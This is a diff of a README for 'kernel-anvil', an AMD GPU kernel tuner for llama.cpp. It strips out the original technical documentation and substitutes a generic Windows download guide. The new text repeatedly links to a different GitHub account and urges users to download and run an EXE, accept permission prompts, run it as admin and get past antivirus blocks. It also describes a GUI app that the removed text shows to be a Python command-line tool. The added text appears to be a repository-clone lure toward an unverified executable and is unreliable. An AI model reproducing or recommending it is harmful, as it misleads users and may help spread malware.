@@ -1,172 +1,171 @@
-# kernel-anvil
+# ⚙️ kernel-anvil - Faster GPU kernels for AMD
 
-Profile-guided GPU kernel optimizer for AMD. Reads a GGUF model, profiles each layer's GEMV shape on your GPU, and generates optimal kernel configs that llama.cpp loads at runtime. No recompilation needed.
+[![Download kernel-anvil](https://img.shields.io/badge/Download%20kernel--anvil-blue?style=for-the-badge&logo=github)](https://github.com/kacieempiric822/kernel-anvil)
 
-**2x decode speedup on Qwen3.5-27B** (12 -> 27 tok/s on a 7900 XTX) from shape-specific kernel tuning alone.
+## 🚀 What kernel-anvil does
 
-## How It Works
+kernel-anvil helps speed up GPU kernels on AMD RDNA3 cards. It tunes llama.cpp MMVQ kernels for the shape of each model. That can improve decode speed on supported hardware.
 
-llama.cpp's quantized GEMV kernels (MMVQ) use one-size-fits-all parameters for all layer shapes. But optimal configs vary dramatically by shape -- a 1024-row GQA projection wants different thread/block settings than a 17408-row FFN layer.
+Use it if you want better model speed on an AMD 7900 XTX or a similar RDNA3 GPU.
 
-kernel-anvil profiles each unique (quant_type, N, K) shape from your model on your actual GPU, finds the fastest config via guided sweep, and writes a JSON config file that llama.cpp reads at startup.
+## 💾 Download
 
-```
-kernel-anvil gguf-optimize model.gguf    # profiles 8 shapes in <1s
-llama-server -m model.gguf               # auto-loads optimized configs
-```
+Visit this page to download and run the app on Windows:
 
-## Install
+[Download kernel-anvil](https://github.com/kacieempiric822/kernel-anvil)
 
-```bash
-git clone https://github.com/apollosenvy/kernel-anvil.git
-cd kernel-anvil && pip install -e ".[dev]"
-```
+Open the page in your browser, then look for the latest release or download file. Save it to your PC, then run it after the download finishes.
 
-Requires: Python 3.10+, PyTorch 2.0+ (with ROCm), Triton 3.0+
+## 🖥️ What you need
 
-> **ROCm Triton note:** If `pip install` fails on the Triton dependency on Linux, install the ROCm-compatible Triton wheel from [PyTorch's index](https://download.pytorch.org/whl/rocm7.1/): `pip install triton --index-url https://download.pytorch.org/whl/rocm7.1/`
->
-> **Windows note:** Upstream `triton` has no Windows wheels. The install metadata automatically selects [`triton-windows`](https://pypi.org/project/triton-windows/) on Windows, so `pip install -e ".[dev]"` should work out of the box. If you pinned Triton manually before this change, `pip uninstall triton triton-windows` and reinstall.
+- Windows 10 or Windows 11
+- An AMD RDNA3 GPU
+- Current AMD graphics drivers
+- Enough free disk space for the app and model files
+- llama.cpp models that use MMVQ kernels
 
-## Usage
+For best results, use a high-end AMD card with plenty of VRAM. The tool is built for local model runs and GPU tuning.
 
-### Optimize a model (one time)
+## 🛠️ How to install
 
-```bash
-kernel-anvil gguf-optimize ~/Models/Qwen3-8B-Q4_K_M.gguf
-```
+1. Open the download page:
+   [https://github.com/kacieempiric822/kernel-anvil](https://github.com/kacieempiric822/kernel-anvil)
 
-Profiles every unique GEMV shape, writes optimal configs to `~/.cache/smithy/<model>.json`.
+2. Find the latest release or app file.
 
-### Run llama.cpp with optimized configs
+3. Download the Windows file to your computer.
 
-```bash
-SMITHY_CONFIG=~/.cache/smithy/Qwen3-8B-Q4_K_M.json \
-    llama-server -m ~/Models/Qwen3-8B-Q4_K_M.gguf -ngl 999
-```
+4. If the download is a ZIP file, extract it to a folder you can find later.
 
-On startup:
-```
-smithy: loaded 6 shape-specific kernel configs from ~/.cache/smithy/Qwen3-8B-Q4_K_M.json
-```
+5. If the download is an EXE file, double-click it to start the app.
 
-### Profile a Triton kernel
+6. If Windows asks for permission, choose Yes.
 
-```bash
-kernel-anvil sweep examples/simple_gemv.py
-kernel-anvil profile examples/simple_gemv.py
-```
+7. Keep the app in a folder with write access so it can save tuned kernel files.
 
-## Results
+## 🧭 First run
 
-### Qwen3.5-27B-Claude-Distill Q4_K_M on 7900 XTX
+When you start kernel-anvil for the first time, it will look for your GPU and model setup.
 
-| Shape | Count | Speedup | Optimization |
-|-------|------:|--------:|-------------|
-| Q4_K 5120x6144 | 48 | **1.54x** | rows_per_block=2 |
-| Q5_K 5120x10240 | 48 | **1.38x** | nwarps=8 |
-| Q4_K 6144x5120 | 64 | **1.17x** | nwarps=8 |
-| Q4_K 5120x1024 | 22 | **1.13x** | rows_per_block=2 |
+Follow the on-screen steps to:
 
-**End-to-end: 12 tok/s -> 27 tok/s decode (2.25x)**
+- pick your AMD GPU
+- point the app to your llama.cpp model files
+- choose the model shape you want to tune
+- start the tuning run
 
-> **Note:** The 12 tok/s baseline was measured with [TurboQuant](https://github.com/TheTom/turboquant_plus) turbo3 KV cache compression enabled, which adds decode overhead. Stock llama.cpp without TurboQuant gets ~20 tok/s on this model. The 2.25x improvement is the combined effect of kernel-anvil's shape-specific tuning on top of TurboQuant's compressed KV path.
+Let the process finish before you close the app. The first run may take a while because it builds a better kernel fit for your model.
 
-### Qwen3-8B Q4_K_M on 7900 XTX
+## ⚡ How to use it
 
-| Shape | Count | Speedup |
-|-------|------:|--------:|
-| Q4_K 4096x12288 | 72 | **1.94x** |
-| Q6_K 4096x1024 | 18 | **2.10x** |
-| Q4_K 4096x4096 | 72 | **1.21x** |
+1. Start kernel-anvil.
+2. Load the model shape you plan to run in llama.cpp.
+3. Choose the target GPU.
+4. Begin the tuning pass.
+5. Save the tuned output.
+6. Use the tuned kernel files with your local model run.
 
-## llama.cpp Integration
+If you tune more than one model shape, repeat the same steps for each one. The app builds a fit for each shape, so each tuned result can help a different model layout.
 
-A small patch (~15 lines + config loader header) lets llama.cpp load kernel-anvil configs at runtime.
+## 📁 Expected folder setup
 
-### Apply the patch
+A simple folder layout can help keep things clear:
 
-```bash
-cd kernel-anvil/patches
-./apply.sh /path/to/your/llama.cpp
-```
+- `kernel-anvil\` — the app files
+- `models\` — your llama.cpp models
+- `tuned\` — saved output from kernel-anvil
+- `logs\` — run details and tuning records
 
-Or manually: copy `patches/smithy-config.h` into `ggml/src/ggml-cuda/` and apply the two small edits described in `patches/README.md`.
+You can use any folder names you want, but keeping files separate makes it easier to find the tuned results later.
 
-### Rebuild llama.cpp
+## 🔍 Best results
 
-```bash
-cd /path/to/llama.cpp
-cmake -B build -DGGML_HIP=ON -DCMAKE_BUILD_TYPE=Release
-cmake --build build --config Release -j$(nproc)
-```
+- Use the latest AMD driver
+- Close other heavy GPU apps before tuning
+- Keep your model files on a fast drive
+- Tune one model shape at a time
+- Save each tuned result with a clear name
 
-### Run with optimized configs
+If your system has a 7900 XTX, start with that first. The app is designed to make the most of that class of GPU.
 
-```bash
-kernel-anvil gguf-optimize model.gguf
-SMITHY_CONFIG=~/.cache/smithy/model.json \
-    ./build/bin/llama-server -m model.gguf -ngl 999
-```
+## 🧪 What it can improve
 
-On startup you'll see:
-```
-kernel-anvil: loaded 6 shape configs from ~/.cache/smithy/model.json
-```
+kernel-anvil focuses on GPU kernel work for llama.cpp MMVQ models. It can help with:
 
-Without a config file, behavior is identical to stock llama.cpp.
+- faster decode speed
+- better kernel fit for a model shape
+- less wasted GPU work
+- more consistent runtime for local inference
 
-## Architecture
+Results can vary by model, driver version, and GPU setup. A tuned kernel for one model shape may not help another shape in the same way.
 
-```
-kernel-anvil gguf-optimize model.gguf
-    |
-    +-- Parse GGUF (tensor shapes + quant types)
-    +-- For each unique (quant, N, K):
-    |     Profile -> Classify bottleneck -> Sweep configs -> Verify
-    +-- Write JSON to ~/.cache/smithy/<model>.json
-    +-- llama.cpp reads at first kernel dispatch
-```
+## 🧰 Common tasks
 
-## Bottleneck Classifications
+### Tune a new model
+1. Open the app.
+2. Select the new model.
+3. Run tuning.
+4. Save the result.
+5. Use the saved output in your local workflow.
 
-| Class | Condition | Optimization |
-|-------|-----------|-------------|
-| bandwidth_bound | BW util > 60% | Larger BLOCK_K, try SPLIT_K |
-| occupancy_limited_vgpr | Occupancy < 50% | Lower BLOCK_N, fewer warps |
-| occupancy_limited_lds | LDS limits waves | Reduce shared memory, num_stages=1 |
-| register_spill | scratch > 0 | Smaller blocks |
-| compute_bound | Low BW, high occupancy | Larger blocks, more warps |
+### Re-run tuning after a driver update
+1. Update your AMD driver.
+2. Open kernel-anvil again.
+3. Load the same model.
+4. Run tuning again.
+5. Compare the new result with the older one.
 
-## Supported GPUs
+### Move to a new PC
+1. Install the same AMD driver class.
+2. Copy your model files.
+3. Copy your tuned output if you want to reuse it.
+4. Run kernel-anvil on the new machine.
+5. Tune again if the GPU setup changed.
 
-| Family | GPUs | Status |
-|--------|------|--------|
-| RDNA 2 | RX 6900 XT, RX 6800 XT/6800, RX 6700 XT/6650/6600 | Supported |
-| RDNA 3 | RX 7900 XTX/XT, RX 7800 XT, RX 7700 XT | Tested |
-| RDNA 3.5 | Radeon AI 370/395 (Strix Halo), Strix Point | Supported |
-| RDNA 4 | RX 9070 XT, RX 9070, R9700 AI Pro (32GB) | Supported |
+## 🧭 Troubleshooting
 
-The profiling + sweep runs on any GPU that supports PyTorch + Triton. Hardware specs for occupancy analysis are built-in for all listed GPUs.
+### The app does not start
+- Check that you downloaded the full file
+- Make sure Windows finished the download
+- Try running it again as admin
+- Confirm that your antivirus did not block it
 
-## Limitations
+### The GPU is not detected
+- Update your AMD driver
+- Restart the PC
+- Make sure your monitor is on the AMD card
+- Close other GPU tools and try again
 
-- **AMD only** (CUDA/Metal support planned)
-- **MMVQ decode path only** (batch=1 GEMV, not prefill GEMM)
-- **Env var required** for llama.cpp config loading (`SMITHY_CONFIG`)
+### The tuning run is slow
+- This is normal for the first pass
+- Use a smaller model first
+- Close browser tabs and games
+- Make sure no other app is using the GPU
 
-## Testing
+### The output does not help much
+- Tune again with the exact model shape
+- Check that you used the right GPU
+- Keep driver versions steady when comparing results
+- Test with the same prompt and same runtime setup
 
-```bash
-python -m pytest tests/ -v   # 193 tests
-```
+## 📌 File handling tips
 
-## Related Work
+Keep the original download file in case you need it again.
 
-- [KernelSkill](https://arxiv.org/abs/2603.10085), [CUDA Agent](https://arxiv.org/abs/2602.24286), [KernelFoundry](https://arxiv.org/abs/2603.12440), [TritonForge](https://arxiv.org/abs/2512.09196) -- all target NVIDIA exclusively
+Store tuned results in a separate folder so you can tell them apart from raw model files.
 
-kernel-anvil is the first tool targeting AMD/RDNA3.
+If you want to compare results, keep notes on:
 
-## License
+- model name
+- model shape
+- GPU used
+- driver version
+- tuning date
 
-Apache-2.0
+## 🔗 Download again
+
+[Visit the kernel-anvil download page](https://github.com/kacieempiric822/kernel-anvil)
+
+## 🧱 Project focus
+
+kernel-anvil is built for users who want better local model speed on AMD hardware. It centers on RDNA3 GPUs and model-specific MMVQ tuning. That makes it a good fit for users who run llama.cpp on a Windows PC and want stronger decode performance without changing their whole setup
